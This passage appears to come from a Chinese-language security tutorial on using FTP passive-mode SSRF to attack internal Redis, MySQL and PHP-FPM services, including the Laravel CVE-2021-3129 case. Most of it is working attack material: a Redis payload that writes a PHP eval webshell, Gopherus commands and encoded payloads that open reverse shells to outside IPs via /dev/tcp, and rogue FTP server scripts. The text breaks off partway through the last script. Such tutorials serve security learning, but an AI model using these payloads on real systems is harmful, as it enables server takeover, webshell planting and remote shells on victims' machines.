    #PASV
    conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,6379)\n') #STOR / (2)
    conn.send(b'150 Permission denied.\n')
    #QUIT
    conn.send(b'221 Goodbye.\n')
    conn.close()
最后直接构造请求发送 Payload：
    /?file=ftp://PI:EMAIL:23/123&data=%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2435%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%22whoami%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
如下图所示，成功写入 Webshell：
###  攻击内网 MySQL
假设内网中存在 MySQL 并且可以未授权访问的话，我们也可以直接攻击其 MySQL，具体操作有查询 MySQL 中的数据、写入 Webshell、UDF
提权执行系统命令等。下面我们以 MySQL 5.7 的 `system` 提权执行系统命令为例进行演示。
首先使用 [Gopherus](https://github.com/tarunkant/Gopherus) 生成 Payload：
    python gopherus.py --exploit mysql
    root    # 这里输入MySQL的用户名
    system bash -c "bash -i >& /dev/tcp/47.101.57.72/2333 0>&1";  # 这里输入的是需要执行的MySQL语句或命令, 这里我们反弹shell
得到的 Payload 只选取 `_` 后面的：
    %a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%3d%00%00%00%03%73%79%73%74%65%6d%20%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%34%37%2e%31%30%31%2e%35%37%2e%37%32%2f%32%33%33%33%20%30%3e%26%31%22%3b%01%00%00%00%01
然后还是在攻击机上运行 evil_ftp.py 启动一个伪 FTP 服务：
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.bind(('0.0.0.0', 23))
    s.listen(1)
    conn, addr = s.accept()
    conn.send(b'220 welcome\n')
    #Service ready for new user.
    #Client send anonymous username
    #USER anonymous
    conn.send(b'331 Please specify the password.\n')
    #User name okay, need password.
    #Client send anonymous password.
    #PASS anonymous
    conn.send(b'230 Login successful.\n')
    #User logged in, proceed. Logged out if appropriate.
    #TYPE I
    conn.send(b'200 Switching to Binary mode.\n')
    #Size /
    conn.send(b'550 Could not get the file size.\n')
    #EPSV (1)
    conn.send(b'150 ok\n')
    #PASV
    conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,3306)\n') #STOR / (2)
    conn.send(b'150 Permission denied.\n')
    #QUIT
    conn.send(b'221 Goodbye.\n')
    conn.close()
开启 nc 监听，等待反弹shell：
最后直接构造请求发送 Payload：
    /?file=ftp://PI:EMAIL:23/123&data=%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%3d%00%00%00%03%73%79%73%74%65%6d%20%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%34%37%2e%31%30%31%2e%35%37%2e%37%32%2f%32%33%33%33%20%30%3e%26%31%22%3b%01%00%00%00%01
如下图所示，成功反弹 Shell：
## 活学活用
###  Laravel Debug mode && FTP SSRF to RCE
Laravel 是一套简洁、开源的 PHP Web 开发框架，旨在实现 Web 软件的 MVC 架构。
2021 年 01 月 12 日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。当 Laravel 开启了 Debug
模式时，由于 Laravel 自带的 Ignition 组件对 `file_get_contents()` 和 `file_put_contents()`
函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意 Log 文件等方式触发 Phar 反序列化，最终造成远程代码执行：
  * vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php
该漏洞可以简化为以下两行：
    $contents = file_get_contents($parameters['viewFile']);
    file_put_contents($parameters['viewFile'], $contents);
可以看到这里主要功能点是：读取一个给定的路径 `$parameters['viewFile']`，并替换读取到的内容中的 `$variableName`
为`$variableName ?? ''`，之后写回文件中 `$parameters['viewFile']`，这相当于什么都没有做！
该漏洞的预期利用方法是重写日志文件然后使用 `phar://` 协议去触发 Phar 反序列化并实现 RCE。但有时候由于某些原因，我们无法是通过该方法进行
RCE，这时候我们便可以考虑本篇文章所讲的知识点，利用 FTP SSRF 攻击内网应用，从而寻找 RCE 的办法。
由于我们可以运行 `file_get_contents` 来查找任何东西，因此，可以运用 SSRF 常用的姿势，通过发送 HTTP
请求来扫描常用端口。假设此时我们发现目标正在监听 9000 端口，则很有可能目标主机上正在运行着 PHP-FPM，我们可以进一步利用该漏洞来攻击 PHP-FPM。
众所周知，如果我们能向 PHP-FPM 服务发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与 `gopher://`
协议结合使用，curl支持 `gopher://` 协议，但 `file_get_contents` 和 `file_put_contents` 却不支持。
另一个已知的允许通过 TCP 发送二进制数据包的协议就是我们本文所讲的 FTP，更准确的说是该协议的被动模式，即：如果一个客户端试图从 FTP
服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个特定的 IP
和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。
现在，由于该 laravel 漏洞中 `file_get_contents` 和 `file_put_contents` 这两个函数在作祟，如果我们尝试使用
`viewFile=ftp://evil-server/file.txt` 来利用这个漏洞，会发生以下情况：
  * `file_get_contents` 连接到我们的FTP服务器，并下载 file.txt。
  * `file_put_contents` 连接到我们的FTP服务器，并将其上传回 file.txt。
现在，你可能已经知道这是怎么回事：我们将使用 FTP 协议的被动模式让 `file_get_contents` 在我们的服务器上下载一个文件，当它试图使用
`file_put_contents` 把它上传回去时，我们将告诉它把文件发送到 127.0.0.1:9000。
这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成 SSRF。
下面我们来演示一下攻击过程。
首先，我们使用gopherus生成攻击fastcgi的payload：
    python gopherus.py --exploit fastcgi
    /var/www/public/index.php  # 这里输入的是目标主机上一个已知存在的php文件
    bash -c "bash -i >& /dev/tcp/192.168.1.7/2333 0>&1"  # 这里输入的是要执行的命令
得到 payload，同样是只需要 payload 中 `_` 后面的数据部分，即：
    %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.7/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
在攻击机上设置好监听：
然后编写如下脚本（脚本是从网上扒的：[https://github.com/Maskhe/evil_ftp，谁叫我菜呢，大佬勿喷~~），在攻击机上搭建一个恶意的](https://github.com/Maskhe/evil_ftp%EF%BC%8C%E8%B0%81%E5%8F%AB%E6%88%91%E8%8F%9C%E5%91%A2%EF%BC%8C%E5%A4%A7%E4%BD%AC%E5%8B%BF%E5%96%B7~~%EF%BC%89%EF%BC%8C%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%9A%84)
ftp 服务，并将上面的 payload 中的数据替换掉下面 ftp 脚本中的 payload 的内容：
    # -*- coding: utf-8 -*-    # @Time    : 2021/1/13 6:56 下午
    # @Author  : tntaxin
    # @File    : ftp_redirect.py
    # @Software:
    import socket
    from urllib.parse import unquote
    # 对gopherus生成的payload进行一次urldecode
    payload = unquote("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.7/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00")
    payload = payload.encode('utf-8')
    host = '0.0.0.0'
    port = 23
    sk = socket.socket()
    sk.bind((host, port))
    sk.listen(5)
    # ftp被动模式的passvie port,监听到1234
    sk2 = socket.socket()
    sk2.bind((host, 1234))
    sk2.listen()
    # 计数器，用于区分是第几次ftp连接
    count = 1
    while 1:
        conn, address = sk.accept()
        conn.send(b"200 \n")
        print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
        if count == 1:
            conn.send(b"220 ready\n")
        else:
            conn.send(b"200 ready\n")
        print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
        if count == 1:
            conn.send(b"215 \n")
        else:
            conn.send(b"200 \n")
        print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小
        if count == 1:
            conn.send(b"213 3 \n")  
        else:
            conn.send(b"300 \n")
        print(conn.recv(20))  # EPSV\r\n'
        conn.send(b"200 \n")
        print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
        if count == 1:
            conn.send(b"227 192,168,1,7,4,210\n")  # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
        else:
            conn.send(b"227 127,0,0,1,35,40\n")  # 端口计算规则：35*256+40=9000
        print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
        if count == 1:
            conn.send(b"125 \n") # 告诉客户端可以开始数据连接了
            # 新建一个socket给服务端返回我们的payload
            print("建立连接!")
            conn2, address2 = sk2.accept()
            conn2.send(payload)
            conn2.close()
            print("断开连接!")
        else: